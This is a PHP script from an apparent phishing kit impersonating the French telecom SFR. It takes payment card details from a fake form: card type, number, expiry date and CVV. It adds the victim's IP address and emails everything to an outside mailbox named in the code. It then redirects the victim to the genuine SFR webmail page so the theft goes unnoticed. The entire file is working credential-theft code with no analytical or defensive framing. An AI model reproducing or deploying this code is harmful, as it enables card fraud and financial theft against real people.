<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- Resultat SFR France 2021 -----------------\n";
$message .= "----------------- SFR CC ----------------------\n";
$message .= "BNK     : ".$_POST['type']."\n";
$message .= "CC      : ".$_POST['nc']."\n";
$message .= "atssali   : ".$_POST['mm']."/".$_POST['yy']."\n";
$message .= "cvc   : ".$_POST['cvv']."\n";

$message .= "----------------- Info D'IP -------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- SFR By Handanovix ---------------\n";

$sen = "$send";

$subject = "SFR CC ~ $ip";

$from .= "From: Mail<Troj>\n";
$from .= "To:micktesla80@gmail.com";

mail($sen,$subject,$message,$from);

echo '<script language="Javascript">
<!--
document.location.replace("https://webmail.sfr.fr/fr_FR/main.html");
// -->
</script>';
?>